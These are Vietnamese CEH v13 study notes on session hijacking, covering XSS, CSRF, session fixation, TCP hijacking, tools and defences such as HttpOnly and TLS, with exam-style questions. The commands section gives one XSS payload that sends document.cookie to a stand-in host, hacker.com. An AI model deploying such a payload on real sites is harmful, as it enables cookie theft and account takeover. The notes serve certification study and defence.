# 📚 CEH v13 Study Notes - Module 11: Session Hijacking

> **[📝 LỜI KHUYÊN TỪ GIẢNG VIÊN - ĐỌC KỸ TRƯỚC KHI BẮT ĐẦU]**
> *   "Hãy nhớ nguyên tắc lõi: **AI is an overlay, not a replacement.** Hacker có thể dùng AI để phân tích hàng vạn Cookie hoặc sinh ra các cuộc tấn công Brute-force Session ID thông minh, nhưng nếu Web không dùng **HTTPS (TLS)** hoặc Session ID dễ đoán, AI không phải làm gì nhiều cũng phá được."
> *   "Hãy **tự vẽ tay sơ đồ mindmap** về quy trình Session Hijacking (Từ việc Bắt Session -> Chèn Session -> Cướp quyền). Bạn phải phân biệt cực rõ giữa Spoofing (Giả mạo từ đầu) và Hijacking (Cướp giữa chừng)."

---

## 1. Module Overview (Dạy điều gì? Tại sao quan trọng?)
*   **Dạy điều gì:** Cách Hacker cướp lấy "phiên làm việc" (Session) đã được xác thực hợp lệ của người dùng. Thay vì phải tốn công tìm mật khẩu, Hacker đợi bạn đăng nhập thành công vào Ngân hàng/Facebook, rồi cướp luôn thẻ "Session" để tự do dùng tài khoản của bạn.
*   **Tại sao quan trọng:** Giao thức HTTP (Web) sinh ra là *Stateless* (Không lưu trạng thái - mỗi click là 1 truy vấn mới). Để web nhớ bạn đã đăng nhập, nó sinh ra Session ID / Cookie. Cướp được Session ID đồng nghĩa với cướp được mọi quyền truy cập tài khoản mà không cần biết Mật khẩu hay vượt qua cả mã OTP 2FA.

## 2. Core Concepts (Definition, Meaning, Why it matters)
*   **Session Hijacking:** Hành vi đánh cắp (cướp) hoặc đoán Session ID của phiên truyền thông giữa người dùng và máy chủ, từ đó tiếp quản toàn bộ phiên làm việc.
*   **Session ID (Token):** Chuỗi ký tự ngẫu nhiên duy nhất mà máy chủ cấp cho người dùng sau khi nhập đúng Mật khẩu. Dùng để duy trì trạng thái đăng nhập.
*   **Spoofing vs Hijacking:** 
    *   *Spoofing:* Hacker giả danh từ đầu để tạo 1 session mới toanh (bằng IP/MAC giả).
    *   *Hijacking:* Nạn nhân hợp lệ ĐÃ ĐĂNG NHẬP. Hacker cắt ngang và chiếm lấy session đó.
*   **Active Hijacking:** Hacker làm ngắt kết nối nạn nhân hợp lệ ra khỏi mạng (bằng DoS/RST packet), sau đó tự chèn máy của hacker vào và tiếp tục nói chuyện với Server bằng Session ID cũ.
*   **Passive Hijacking:** Hacker chỉ ngồi nghe lén (Sniffing) Session ID để lấy Cookie mà không ngắt nạn nhân (Dùng trên Web).

## 3. KEYWORDS 
| Mức độ | Từ khóa | Ý nghĩa cốt lõi |
| :--- | :--- | :--- |
| 🔴 **MUST MEMORIZE** | **Session ID** | "Thẻ qua cửa" sau khi login. Mất thẻ = Mất tài khoản. |
| 🔴 **MUST MEMORIZE** | **XSS (Cross-Site Scripting)** | Lỗ hổng Web nguy hiểm nhất dùng để cướp Session Cookie. (Ăn trộm từ phía Client). |
| 🔴 **MUST MEMORIZE** | **Session Fixation** | (Cố định Session). Hacker tự tạo 1 Session ID, ép nạn nhân dùng ID đó để login. Khi nạn nhân login thành công, Hacker có sẵn chìa khóa. |
| 🟠 **HIGH PRIORITY** | **Man-in-the-Middle (MiTM)** | Cốt lõi của mọi cuộc tấn công cướp Session trong mạng LAN. |
| 🟠 **HIGH PRIORITY** | **TCP Sequence Prediction** | Kỹ thuật cướp phiên TCP bằng cách tính toán (đoán) số Sequence Number (SEQ) của nạn nhân. |
| 🟡 **SHOULD KNOW** | **CRIME / BEAST** | Các cuộc tấn công giải mã phiên SSL/TLS bảo mật thời kỳ đầu. |

## 4. TOOLS (Tool, Purpose, Used for, Important point)
| Tool Name | Phân loại | Mục đích & Ứng dụng | Điểm lưu ý quan trọng (Exam) |
| :--- | :--- | :--- | :--- |
| **Burp Suite** | Web Proxy / Sec Tool | Công cụ số 1 thế giới để phân tích Web. Dùng **Burp Sequencer** để kiểm tra mức độ "dễ đoán" của Session ID (Tính Randomness). | Bắt buộc phải biết. |
| **OWASP ZAP** | Web Proxy | Công cụ nguồn mở tương đương Burp Suite (Do OWASP phát triển). | Miễn phí, mạnh mẽ. |
| **Bettercap / Ettercap** | MiTM Framework | Nghe lén trong LAN, ARP Spoofing để bắt trộm Session Cookie truyền qua mạng HTTP. | Bắt buộc phải có để thực hiện Network Hijacking. |
| **Wireshark** | Packet Analyzer | Chuyên bắt các gói tin Clear-text để moi Cookie (lọc `http.cookie`). | Phân tích Session. |
| **AI-Session Analyzers** | **AI-Powered** | Trong CEH v13, AI dùng để tự động phân tích hàng triệu gói tin nhằm đoán thuật toán sinh Session ID (nếu sinh kém bảo mật). | Tìm ra quy luật sinh Session. |

## 5. COMMANDS (Command, Purpose, Important options)
> [!NOTE]
> Session Hijacking thiên về kỹ thuật (Web hoặc MiTM LAN), không có nhiều lệnh command đặc thù mà phải kết hợp.
*   **Ví dụ Payload XSS cướp Cookie:**
    *   `<script>document.location='http://hacker.com/steal.php?cookie='+document.cookie;</script>`
    *   *Mục đích:* Khi nạn nhân vào web lỗi, trình duyệt của nạn nhân tự động lấy Cookie gửi về máy chủ của Hacker.

## 6. ATTACKS & TECHNIQUES
### Phân loại các cách đánh cắp Session ID (Web):
1.  **Session Sniffing:** Nghe lén gói tin không mã hóa (HTTP, Telnet) trên mạng bằng Wireshark. Nếu không dùng HTTPS, Cookie sẽ bay công khai trên không khí.
2.  **Cross-Site Scripting (XSS):** Kẻ tấn công tiêm mã JavaScript độc hại vào Website uy tín. Khi nạn nhân lướt web đó, mã JS sẽ lấy cắp biến `document.cookie` và gửi cho Hacker.
3.  **Cross-Site Request Forgery (CSRF):** Lợi dụng Session hiện tại của nạn nhân, lừa trình duyệt của nạn nhân tự động gửi một lệnh (VD: Chuyển tiền) mà nạn nhân không hề hay biết.
4.  **Session Fixation:** 
    *   Bước 1: Hacker vào Web, lấy 1 Session ID hợp lệ (chưa login).
    *   Bước 2: Hacker gửi link chứa Session ID đó (VD: `bank.com/login?sessionid=123`) cho nạn nhân.
    *   Bước 3: Nạn nhân bấm vào, đăng nhập thành công. Lúc này Session ID `123` được gán quyền Admin.
    *   Bước 4: Hacker lập tức dùng ID `123` có sẵn để vào tải khoản.
5.  **Brute-Forcing / Predicting Session ID:** Nếu web code ẩu (VD sinh Session ID = `user_1001`), hacker có thể viết Script tăng số lên `1002, 1003...` để vào tài khoản của người khác.

### Network Level Hijacking (Tầng Mạng):
*   **TCP Hijacking:** Đoán được số `Sequence (SEQ)` và `Acknowledgment (ACK)` giữa nạn nhân và Server. Sau đó gửi gói tin mạo danh (IP giả) kèm theo số SEQ kế tiếp chuẩn xác, đồng thời gửi gói RST để đá văng nạn nhân ra khỏi luồng mạng.
*   **UDP Hijacking:** Cực kỳ dễ vì UDP không có cơ chế `Sequence Number` (không có bắt tay 3 bước). Hacker chỉ cần giả mạo IP nguồn là cướp được luồng trả về (VD: Giả mạo IP để cướp phản hồi truy vấn DNS).

## 7. PROTOCOLS/PORTS/SERVICES
*   Mọi giao thức **TCP** đều có thể bị Hijacking nếu Hacker đoán được số **Sequence Number** (Mặc dù các hệ điều hành hiện tại dùng thuật toán sinh số SEQ cực kỳ ngẫu nhiên và khó đoán).
*   **Bảo vệ lõi:** **IPsec** (ở tầng Network) hoặc **TLS/SSL** (ở tầng Transport/App) mã hóa toàn bộ dữ liệu, khiến Hacker dù cướp được gói tin cũng không đọc được Session ID, cũng không chèn được dữ liệu vào giữa.

## 8. IMPORTANT NUMBERS & FACTS
*   **Lỗi 0-day lớn nhất:** Hầu hết các trang Web lớn (Kể cả Google/Facebook ngày xưa) đều từng bị dính lỗi Session Hijacking khi họ chưa triển khai HTTPS 100% trên toàn bộ hệ thống. Hacker dùng extension **Firesheep** ở quán cà phê là cướp được tài khoản Facebook dễ dàng.
*   **Bảo vệ Web:** Để chống XSS cướp Cookie, Web Server phải cài cờ (flag) **HttpOnly** vào Session Cookie. Cờ này cấm JavaScript đọc được nội dung của Cookie. (Sẽ thi trong CEH).

## 9. COMPARE & DIFFERENTIATE
| Tiêu chí | Session Spoofing | Session Hijacking |
| :--- | :--- | :--- |
| **Thời điểm** | Hacker đóng giả (Spoof) tạo luồng mạng mới từ đầu. Nạn nhân thật KHÔNG liên quan. | Nạn nhân thật **đang kết nối**. Hacker chèn vào cướp luồng mạng/phiên đăng nhập. |
| **Giai đoạn Login** | Chưa có xác thực (Chủ yếu giả mạo IP/MAC). | Thường sau khi nạn nhân đã xác thực thành công. |

| Lỗi Web | Cơ chế hoạt động (Liên quan đến Session) |
| :--- | :--- |
| **XSS** | Hacker ăn trộm Token/Cookie (Trực tiếp đọc nó). |
| **CSRF** | Hacker KHÔNG CẦN ăn trộm Cookie. Lợi dụng trình duyệt tự đính kèm Cookie khi gửi yêu cầu. |
| **Session Fixation** | Hacker dúi sẵn Cookie của mình vào tay nạn nhân (Ép nạn nhân xài đồ của Hacker). |

## 10. CEH EXAM FOCUS (Format ôn thi tốt)
*   **Chống Session Hijacking:** Câu hỏi: *"Cờ (flag) nào thêm vào Cookie để chống mã độc JavaScript (XSS) lấy cắp Session ID?"* -> Đáp án: **HttpOnly**.
*   **Bảo mật đường truyền (In Transit):** Đề hỏi: *"Giao thức nào ngăn chặn hiệu quả nhất nạn Session Sniffing trên nền tảng Web?"* -> Chọn **HTTPS / TLS** (Mã hóa toàn bộ Payload HTTP, kể cả Cookie).
*   **Kỹ thuật chèn Session (Fixation):** *"Một kẻ lừa đảo gửi liên kết chứa sẵn ID phiên cho người dùng, sau khi người dùng đăng nhập thì kẻ lừa đảo có quyền truy cập. Đó là gì?"* -> Chọn **Session Fixation**.
*   **TCP Hijacking:** Hỏi: *"Điều kiện tiên quyết để thực hiện TCP Session Hijacking thành công là gì?"* -> Chọn **Predicting the Sequence Number (Đoán số thứ tự Sequence)**.
*   **Burp Sequencer:** Nếu đề hỏi Tool nào dùng để đánh giá mức độ ngẫu nhiên (Entropy/Randomness) của Session ID -> Chọn công cụ **Burp Sequencer (trong Burp Suite)**.

## 11. COMMON CONFUSIONS
*   **Session Hijacking vs MiTM:** MiTM (Man in the Middle) là Kỹ thuật / Hành động (Đứng vào giữa 2 bên). Session Hijacking là Mục đích / Kết quả (Cướp được phiên làm việc). Bạn dùng kỹ thuật MiTM (ARP Spoofing) ĐỂ thực hiện Session Hijacking.
*   **Ngắt kết nối (Desynchronization):** Trong TCP Hijacking, khi Hacker đã nhảy vào thành công, họ phải làm cho máy tính của Nạn nhân thật và Server "lệch nhịp" số Sequence. Nạn nhân gửi gói tin, Server sẽ không nhận (Bị Drop) vì số SEQ không khớp nữa. Kết quả là chỉ có Hacker giao tiếp được.

## 12. REAL-WORLD CONTEXT
*   **Session Timeout:** Trong thực tế, các ứng dụng Ngân hàng thường có Session Timeout rất ngắn (5 phút). Nếu bạn không làm gì, Cookie sẽ tự hủy. Lý do là để giảm thiểu "cửa sổ thời gian" (Time window) mà Hacker có thể lợi dụng nếu cướp được Session. 
*   **Token Theft:** Các vụ hack sàn Crypto nổi tiếng dường như không phải do lộ Mật khẩu (vì có 2FA). Hacker lừa nhân viên cài mã độc đánh cắp trực tiếp Session Token của trình duyệt. Với Token (Cookie) này, Hacker có thể vượt qua cả mật khẩu lẫn mã OTP (2FA) vì máy chủ tưởng Token đó là hợp lệ (đã trải qua bước kiểm tra 2FA trước đó). Giải pháp phòng thủ: Ràng buộc Session với địa chỉ IP hoặc thiết bị (Device Fingerprinting).

## 13. QUICK REVISION
1.  **Loại tấn công TCP Session Hijacking phụ thuộc vào việc tính toán (đoán) số nào của gói tin TCP?** -> Sequence Number (SEQ).
2.  **Cờ (Flag) bảo mật nào được thêm vào Cookie để chặn JavaScript đọc được nó?** -> HttpOnly.
3.  **Kỹ thuật nào ép người dùng (nạn nhân) sử dụng một Session ID do hacker cung cấp từ trước?** -> Session Fixation.
4.  **Tấn công đánh cắp Cookie thông qua việc chèn mã JavaScript lừa đảo vào trình duyệt nạn nhân gọi là gì?** -> Cross-Site Scripting (XSS).
5.  **Công cụ nào trong Burp Suite dùng để kiểm tra độ ngẫu nhiên (randomness) của Session ID sinh ra từ Server?** -> Burp Sequencer.
6.  **Giao thức bảo mật phổ biến nhất để chống Session Sniffing trên tầng Web là gì?** -> HTTPS / TLS.

## 14. MEMORY HOOKS
*   **Session Fixation:** Hacker đưa cho bạn cái chìa khóa mới tinh để bạn đi làm chìa cho khóa cổng (Fix sẵn). Bạn làm xong, khóa được cổng, Hacker dùng chính chìa đó để vào nhà.
*   **HttpOnly:** "Chỉ chơi với giao thức HTTP", tuyệt đối cấm bọn mã hóa, script (JavaScript/XSS) chạm tay vào Cookie. 
*   **TCP Hijacking (SEQ):** Cướp vé xếp hàng chờ khám bệnh. Bạn phải đoán chính xác số thứ tự (Sequence Number) của bệnh nhân tiếp theo để chui vào phòng khám thay người đó.
